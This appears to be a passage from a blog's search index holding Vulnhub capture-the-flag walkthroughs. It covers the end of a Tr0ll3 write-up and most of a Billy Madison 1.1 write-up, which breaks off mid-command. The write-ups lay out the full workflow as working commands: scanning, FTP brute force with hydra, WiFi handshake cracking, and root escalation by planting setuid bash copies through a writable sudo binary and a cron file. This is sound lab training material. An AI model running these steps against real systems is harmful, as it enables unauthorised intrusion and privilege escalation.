192.168.110.4 4444 &amp;lt; maleus SSH w/ malues private key Root - Creds Found (Password) + SUDO View files in maleus’s home directory maleus@Tr0ll3:~$ find $(pwd) /home/maleus /home/maleus/.viminfo /home/maleus/.bashrc /home/maleus/.ssh /home/maleus/.ssh/maleus.pub /home/maleus/.ssh/maleus /home/maleus/.ssh/authorized_keys /home/maleus/dont_even_bother /home/maleus/.gnupg /home/maleus/.gnupg/private-keys-v1.d /home/maleus/.profile /home/maleus/.bash_logout /home/maleus/.cache /home/maleus/.cache/motd.legal-displayed maleus@Tr0ll3:~$ dont_even_bother Execute dont_even_bother to see what it does maleus@Tr0ll3:~$ ./dont_even_bother Enter the password : Wrong Password maleus@Tr0ll3:~$ View contents of dont_even_bother w/ strings maleus@Tr0ll3:~$ strings dont_even_bother /lib64/ld-linux-x86-64.so.2 libc.so.6 gets puts __stack_chk_fail strcmp __libc_start_main __gmon_start__ GLIBC_2.4 GLIBC_2.2.5 UH-X UH-X []A\\A]A^A_ Enter the password : xl8Fpx%6 Wrong Password Correct Password Your reward is just knowing you did it! :-P ;*3$&quot; GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2 xl8Fpx%6 Execute dont_even_bother specifying the password, xl8Fpx%6 maleus@Tr0ll3:~$ ./dont_even_bother Enter the password : xl8Fpx%6 Correct Password Your reward is just knowing you did it! :-P Rabbit Hole View .viminfo maleus@Tr0ll3:~$ cat .viminfo # This viminfo file was generated by Vim 7.4. # You may edit it if you&#39;re careful! # Value of &#39;encoding&#39; when this file was written *encoding=utf-8 # hlsearch on (H) or off (h): ~h # Command Line History (newest to oldest): :wq :q :q! :!shell # Search String History (newest to oldest): # Expression History (newest to oldest): # Input Line History (newest to oldest): # Input Line History (newest to oldest): # Registers: &quot;&quot;1 LINE 0 passwd &quot;2 LINE 0 B^slc8I$ &quot;3 LINE 0 passswd # File marks: # Jumplist (newest first): # History of marks within files (newest to oldest): + 25 62 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 &amp;gt; ~/Desktop/troll3/maleus * 1564779412 0 &quot; 27 28 ^ 27 29 . 27 28 + 27 28 B^slc8I$ is likely maleus’s password Check maleus’s sudo access maleus@Tr0ll3:~$ sudo -l [sudo] password for maleus: B^slc8I$ Matching Defaults entries for maleus on Tr0ll3: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User maleus may run the following commands on Tr0ll3: (root) /home/maleus/dont_even_bother /home/maleus/dont_even_bother View permission of /home/maleus/dont_even_bother binary maleus@Tr0ll3:~$ ls -l /home/maleus/dont_even_bother -rwxrwxr-x 1 maleus maleus 8674 Jun 18 2015 /home/maleus/dont_even_bother We have write access Replace /home/maleus/dont_even_bother w/ a binary to spawn a root shell maleus@Tr0ll3:~$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /home/maleus/dont_even_bother; chmod 4777 /home/maleus/dont_even_bother Execute /home/maleus/dont_even_bother as root to create a root shell maleus@Tr0ll3:~$ sudo /home/maleus/dont_even_bother maleus@Tr0ll3:~$ ls -l /tmp total 2092 -rw-r--r-- 1 eagle russ 118013 Feb 25 04:29 eagle.out -rw-rw-r-- 1 start start 117861 Feb 25 04:26 linpeas.out -rwxrwxrwx 1 start start 762836 Dec 31 09:16 linpeas.sh -rwsr-xr-x 1 root root 1113504 Feb 25 13:11 rootbash # SUID Bit is set Obtain root shell rootbash-4.4# id;whoamiuid=1000(maleus) gid=1000(maleus) euid=0(root) groups=1000(maleus),1005(backups)rootrootbash-4.4# Root Flag rootbash-4.4# cd /rootrootbash-4.4# lsflag.txtrootbash-4.4# cat flag.txt You are truly a Jedi!Twitter Proof:Pr00fThatTh3L33tHax0rG0tTheFl@g!!@Maleus21rootbash-4.4# " }, { "title": "Vulnhub - Billy Madison 1.1", "url": "/posts/Billy-Madison-1.1/", "categories": "Vulnhub, Linux", "tags": "cryptography, wireshark, port-knocking, linux-priv-esc/suid/unknown-exec", "date": "2022-02-24 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34]└─# cat scans/_full_tcp_nmap.txt # Nmap 7.92 scan initiated Mon Feb 22 21:34:23 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/xml/_full_tcp_nmap.xml 192.168.110.34adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time.adjust_timeouts2: packet supposedly had rtt of -761685 microseconds. Ignoring time.Nmap scan report for 192.168.110.34Host is up, received arp-response (0.00042s latency).Scanned at 2022-02-21 21:34:38 +08 for 179sNot shown: 65526 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION22/tcp open tcpwrapped syn-ack ttl 64|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)23/tcp open tcpwrapped syn-ack ttl 6469/tcp open caldav syn-ack ttl 64 Radicale calendar and contacts server (Python BaseHTTPServer)|_http-server-header: MadisonHotelsWordpress|_http-title: Welcome | Just another WordPress site| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-generator: WordPress 1.080/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Oh nooooooo!| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS137/tcp closed netbios-ns reset ttl 64138/tcp closed netbios-dgm reset ttl 64139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)2525/tcp open smtp syn-ack ttl 64 SubEtha smtpd| smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok|_ SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use &quot;HELP &amp;lt;topic&amp;gt;&quot;. End of HELP infoMAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.10 - 4.11TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/21%OT=69%CT=137%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6OS:21395A1%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=101%TI=Z%CI=I%TS=8)OPSOS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECNOS:(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%FOS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)TOS:5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=A%OS:A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=N)Uptime guess: 0.001 days (since Mon Feb 21 21:36:20 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=253 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: BMHost script results:|_clock-skew: mean: 9h59m58s, deviation: 3h27m51s, median: 7h59m57s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 42428/tcp): CLEAN (Timeout)| Check 2 (port 15395/tcp): CLEAN (Timeout)| Check 3 (port 36534/udp): CLEAN (Timeout)| Check 4 (port 64576/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2022-02-21T21:36:58|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.9-Ubuntu)| Computer name: bm| NetBIOS computer name: BM\\x00| Domain name: \\x00| FQDN: bm|_ System time: 2022-02-21T15:36:56-06:00TRACEROUTEHOP RTT ADDRESS1 0.42 ms 192.168.110.34Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Feb 21 21:37:37 2022 -- 1 IP address (1 host up) scanned in 194.04 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.34/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________index.php [Status: 200, Size: 937, Words: 96, Lines: 25]manual [Status: 301, Size: 317, Words: 20, Lines: 10]:: Progress: [27690/27690] :: Job [1/1] :: 460 req/sec :: Duration: [0:00:04] :: Errors: 0 :: index.phpTCP/139,445 (SMB)Enum4linux ----------------------------------------| Shares via RPC on 192.168.110.34 | ----------------------------------------[*] Enumerating shares[+] Found 2 share(s):EricsSecretStuff: comment: &#39;&#39; type: DiskIPC$: comment: IPC Service (BM) type: IPC[*] Testing share EricsSecretStuff[+] Mapping: OK, Listing: OK[*] Testing share IPC$ EricsSecretStuffCrackmapexec┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot]└─# crackmapexec smb $ip -u &#39; &#39; -p &#39; &#39; --sharesSMB 192.168.110.34 445 BM [*] Windows 6.1 (name:BM) (domain:) (signing:False) (SMBv1:True)SMB 192.168.110.34 445 BM [+] \\ : SMB 192.168.110.34 445 BM [+] Enumerated sharesSMB 192.168.110.34 445 BM Share Permissions RemarkSMB 192.168.110.34 445 BM ----- ----------- ------SMB 192.168.110.34 445 BM EricsSecretStuff READ SMB 192.168.110.34 445 BM IPC$ IPC Service (BM) EricsSecretStuff - READInitial FootholdTCP/23 (Telnet) - Cryptography Access telnet ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1] └─# nc $ip 23 | tee telnet.txt ***** HAHAH! You&#39;re banned for a while, Billy Boy! By the way, I caught you trying to hack my wifi - but the joke&#39;s on you! I don&#39;t use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! ***** rkfpuzrahngvat ROTten ROT substitution cipher Identify ciphertext Decipher it ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit] └─# echo rkfpuzrahngvat | rot13 exschmenuating Password/Directory? TCP/139,445 (SMB) - Rabbit Hole Download all files from EricsSecretStuff fileshare ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/smb] └─# smbclient //$ip/EricsSecretStuff -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\root&#39;s password: getting file \\._.DS_Store of size 4096 as ._.DS_Store (250.0 KiloBytes/sec) (average 250.0 KiloBytes/sec) getting file \\ebd.txt of size 35 as ebd.txt (17.1 KiloBytes/sec) (average 224.1 KiloBytes/sec) getting file \\.DS_Store of size 6148 as .DS_Store (600.4 KiloBytes/sec) (average 358.5 KiloBytes/sec) View files Proceed to TCP/69TCP/69 (HTTP) - Rabbit Hole Find out the service running @ TCP/69 ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http] └─# nc $ip 69 test &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Error response&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Error response&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;Error code 400. &amp;lt;p&amp;gt;Message: Bad request syntax (&#39;test&#39;). &amp;lt;p&amp;gt;Error code explanation: 400 = Bad request syntax or unsupported method. &amp;lt;/body&amp;gt; HTTP Fix ERR UNSAFE PORT FFUF ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]└─# ffuf -u http://$ip:69/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.txt,.php,.html&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.34:69/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .txt .php .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ index.php [Status: 200, Size: 6589, Words: 565, Lines: 133]readme.html [Status: 200, Size: 9231, Words: 995, Lines: 108]wp-admin [Status: 302, Size: 231, Words: 22, Lines: 4]wp-login.php [Status: 200, Size: 2021, Words: 136, Lines: 58]xmlrpc.php [Status: 200, Size: 42, Words: 6, Lines: 1]:: Progress: [18460/18460] :: Job [1/1] :: 811 req/sec :: Duration: [0:00:26] :: Errors: 0 Wordpress CMS Enumerate wordpress Enumerate wordpress version &amp;amp; users ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http] └─# wpscan --no-update --disable-tls-checks --url http://$ip:69 -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan.txt&quot; [i] User(s) Identified: [+] admin | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: Author Id Brute Forcing - Display Name (Aggressive Detection) Enumerate wordpress plugins ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip:69 -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan_plugins.txt&quot; [i] No plugins Found. Proceed to exschmenuating, does not exist TCP/69 is a rabbitholeTCP/80 (HTTP) - Directory Enumeration Proceed to http://192.168.110.34/index.php Proceed to exschmenuating veronica is somewhere in the filename captured suggests it is a .pcap,cap,.captured file veronica as part of her passwords Create a wordlist (veronica.txt) by extracting veronica from rockyou.txt ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit] └─# cat /usr/share/wordlists/rockyou.txt | grep veronica &amp;gt; veronica.txt FFUF ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit] └─# ffuf -u http://192.168.110.34/exschmenuating/FUZZ -w veronica.txt -e &#39;.pcap,.cap,.captured,.html,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.34/exschmenuating/FUZZ :: Wordlist : FUZZ: veronica.txt :: Extensions : .pcap .cap .captured .html .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ 012987veronica.cap [Status: 200, Size: 8700, Words: 353, Lines: 193] :: Progress: [4638/4638] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:04] :: Errors: 6 :: 012987veronica.cap Wireshark Analysis 012987veronica.cap captured email conversation between Veronica &amp;amp; Eric. Mail 2 and 3 contains interesting information View the conversation w/ filter: tcp.stream eq 0-5 Mail 2: EHLO kali MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt; RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt; DATA Date: Sat, 20 Aug 2016 21:57:00 -0500 To: eric@madisonhotels.com From: vvaughn@polyfector.edu Subject: test Sat, 20 Aug 2016 21:57:00 -0500 X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ RE: VIRUS ALERT! Eric, Thanks for your message. I tried to download that file but my antivirus blocked it. Could you just upload it directly to us via FTP? We keep FTP turned off unless someone connects with the &quot;Spanish Armada&quot; combo. https://www.youtube.com/watch?v=z5YU7JwVy7s -VV . QUIT Spanish Armada combo The video contains the port knocking sequence. From 0:27 - 0:46 1466, 67, 1469, 1514, 1981, 1986 Mail 3 EHLO kali MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt; RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt; DATA Date: Sat, 20 Aug 2016 21:57:11 -0500 To: vvaughn@polyfector.edu From: eric@madisonhotels.com Subject: test Sat, 20 Aug 2016 21:57:11 -0500 X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ RE[2]: VIRUS ALERT! Veronica, Thanks that will be perfect. Please set me up an account with username of &quot;eric&quot; and password &quot;ericdoesntdrinkhisownpee.&quot; -Eric . QUIT eric:ericdoesntdrinkhisownpee. Port Knocking Port Knock ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark] └─# knock -v $ip 1466 67 1469 1514 1981 1986 hitting tcp 192.168.110.34:1466 hitting tcp 192.168.110.34:67 hitting tcp 192.168.110.34:1469 hitting tcp 192.168.110.34:1514 hitting tcp 192.168.110.34:1981 hitting tcp 192.168.110.34:1986 Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1] └─# nmap $ip -p- PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 69/tcp open tftp 80/tcp open http 137/tcp closed netbios-ns 138/tcp closed netbios-dgm 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2525/tcp open ms-v-worlds MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC) TCP/21 TCP/21 (FTP) Access FTP w/ eric:ericdoesntdrinkhisownpee, check for write access ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark] └─# ftp $ip Connected to 192.168.110.34. 220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com) Name (192.168.110.34:root): eric 331 User name okay, need password. Password: 230 User logged in, proceed. Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; passive Passive mode: off; fallback to active mode: off. ftp&amp;gt; put test local: test remote: test 200 PORT command successful. 150 Opening I mode data connection for test. 0 0.00 KiB/s 226 Transfer completed for &quot;test&quot;. ftp&amp;gt; dir 200 PORT command successful. 150 Opening A mode data connection for /. -rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129 -rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772 -rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773 -rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049 -rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054 -rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes -rwxrwxrwx 1 ftp 0 Feb 21 22:15 test 226 Transfer completed. Download all files ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/ftp] └─# wget -m --no-passive ftp://eric:ericdoesntdrinkhisownpee@$ip View the files .notes The video contains the blanks From 0:07 - 0:08 “My kid will be a soccer player” WiFi Password from Veronica’s FTP folders. TCP/2525 (SMTP) Send an email to Eric ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http] └─# telnet $ip 2525 Trying 192.168.110.34... Connected to 192.168.110.34. Escape character is &#39;^]&#39;. 220 BM ESMTP SubEthaSMTP null MAIL FROM: asdf 250 Ok RCPT TO: eric@madisonhotels.com 250 Ok DATA 354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt; My kid will be a soccer player . 250 Ok QUIT 221 Bye Connection closed by foreign host. Check for newly opened ports ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http] └─# nmap $ip -v -p- PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 69/tcp open tftp 80/tcp open http 137/tcp closed netbios-ns 138/tcp closed netbios-dgm 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1974/tcp open drp 2525/tcp open ms-v-worlds MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC) TCP/1974 TCP/1974 (SSH) Failed to SSH w/ eric:ericdoesntdrinkhisownpee Earlier, Eric mentioned that we are able to login w/ his WiFi password, and it could be in Veronica’s FTP Folder. Veronica is likely to use a password based off her name.TCP/21(FTP) - Bruteforce Bruteforce FTP against veronica.txt wordlist ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit] └─# hydra -l veronica -P veronica.txt -e nsr ftp://$ip Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-23 21:09:24 [DATA] max 16 tasks per 1 server, overall 16 tasks, 776 login tries (l:1/p:776), ~49 tries per task [DATA] attacking ftp://192.168.110.34:21/ [21][ftp] host: 192.168.110.34 login: veronica password: babygirl_veronica07@yahoo.com 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-23 21:09:43 veronica:babygirl_veronica07@yahoo.com Download all files ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp] └─# wget -m --no-passive ftp://veronica:babygirl_veronica07%40yahoo.com@$ip View files email-from-billy.eml eg-01.cap packet capture file Crack .cap file eg-01.cap captured WiFi traffic ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34] └─# tcpdump -r eg-01.cap reading from file eg-01.cap, link-type IEEE802_11 (802.11), snapshot length 65535 IEEE802_11 Crack eg-01.cap w/ aircrack-ng ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34] └─# aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt Aircrack-ng 1.6 [00:12:25] 3051073/14344392 keys tested (4151.08 k/s) Time left: 45 minutes, 20 seconds 21.27% KEY FOUND! [ triscuit* ] Master Key : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92 Transient Key : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 EAPOL HMAC : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33 eric:triscuit* TCP/1974 (SSH) SSH w/ eric:triscuit* Privilege EscalationRoot - Via SUID Binary Enumerate SUID binaries eric@BM:/tmp$ find / -perm -4000 2&amp;gt;/dev/null /usr/local/share/sgml/donpcgd /usr/bin/sudo /usr/bin/pkexec /usr/bin/passwd /usr/bin/newgidmap /usr/bin/chsh /usr/bin/gpasswd /usr/bin/newuidmap /usr/bin/newgrp /usr/bin/at /usr/bin/chfn /usr/bin/ubuntu-core-launcher /usr/lib/eject/dmcrypt-get-device /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /bin/mount /bin/su /bin/umount /bin/fusermount /bin/ping6 /bin/ping /bin/ntfs-3g eric@BM:/tmp$ /usr/local/share/sgml/donpcgd, is an unknown binary Execute /usr/local/share/sgml/donpcgd to see what it does eric@BM:/tmp$ /usr/local/share/sgml/donpcgd Usage: /usr/local/share/sgml/donpcgd path1 path2 eric@BM:/tmp$ Able to specify 2 paths /usr/local/share/sgml/donpcgd allows us to create a file that has the same permissions as path1 anywhere path1: file created will have the same permission as the specified file. path2: path where you want the file to be created The file created is empty Test our theory eric@BM:/tmp$ ls -l /etc/passwd -rw-r--r-- 1 root root 1717 Aug 20 2016 /etc/passwd # take note of the permission eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /etc/passwd /tmp/testing1 #### mknod(/tmp/testing1,81a4,0) eric@BM:/tmp$ ls -la total 920 ... -rw-r--r-- 1 root root 0 Feb 22 02:08 testing1 # same permissions as /etc/passwd ... Obtain root by creating a writable file at /etc/cron.hourly, that will create a root shell. eric@BM:/tmp$ touch /tmp/test eric@BM:/tmp$ /usr/local/share/sgml/donpcgd /tmp/test /etc/cron.hourly/rootbash #### mknod(/etc/cron.hourly/rootbash,81b4,0) eric@BM:/tmp$ ls -l /etc/cron.hourly total 0 -rw-rw-r-- 1 eric eric 0 Feb 22 04:25 rootbash eric@BM:/tmp$ printf &#39;#!/bin/bash\\n\\ncp /bin/bash /tmp/rootbash &amp;amp;&amp;amp; chmod u+s /tmp/rootbash\\n&#39; &amp;gt; /etc/cron.hourly/rootbash; chmod 4777 /etc/cron.hourly/rootbash eric@BM:/tmp$ ls -l /etc/cron.hourly total 4 -rwsrwxrwx 1 eric eric 67 Feb 22 04:26 rootbash Wait for cronjob to execute eric@BM:/tmp$ ls -la total 4944 ... -rw-r--r-- 1 root root 0 Feb 22 01:24 passwd -rwxrwxr-x 1 eric eric 3078592 Feb 22 03:00 pspy64 -rwsr-xr-x 1 root root 1037528 Feb 22 05:17 rootbash ... Obtain root eric@BM:/tmp$ /tmp/rootbash -p /PRIVATE - Crack Truecrypt Volume View files in /PRIVATE/ root@BM:/PRIVATE# ls -la total 1036 drwx------ 2 root root 4096 Aug 29 2016 . drwxr-xr-x 25 root root 4096 Feb 22 01:32 .. -rw-rw-r-- 1 billy billy 1048576 Aug 21 2016 BowelMovement -rw-r--r-- 1 root root 221 Aug 29 2016 hint.txt root@BM:/PRIVATE# View files hint.txt root@BM:/PRIVATE# cat hint.txt Heh, I called the file BowelMovement because it has the same initials as Billy Madison. That truely cracks me up! LOLOLOL! I always forget the password, but it&#39;s here: https://en.wikipedia.org/wiki/Billy_Madison -EG root@BM:/PRIVATE# That truely cracks me up! BowelMovement Truecrypt volume, based on hint.txt, truely cracks me up! Create a wordlist from the wikipedia link ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit] └─# cewl https://en.wikipedia.org/wiki/Billy_Madison -w wiki.txt -d 0 -v Crack BowelMovement w/ truecrack ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot] └─# truecrack -t BowelMovement -w ../exploit/wiki.txt TrueCrack v3.6 Website: https://github.com/lvaccaro/truecrack Contact us: infotruecrack@gmail.com Found password: &quot;execrable&quot; Password length: &quot;10&quot; Total computations: &quot;744&quot; Download veracrypt to mount BowelMovement Download veracrypt-1.25.9-setup.tar.bz2 wget https://launchpad.net/veracrypt/trunk/1.25.9/+download/veracrypt-1.25.9-setup.tar.bz2 Extract tar -xf 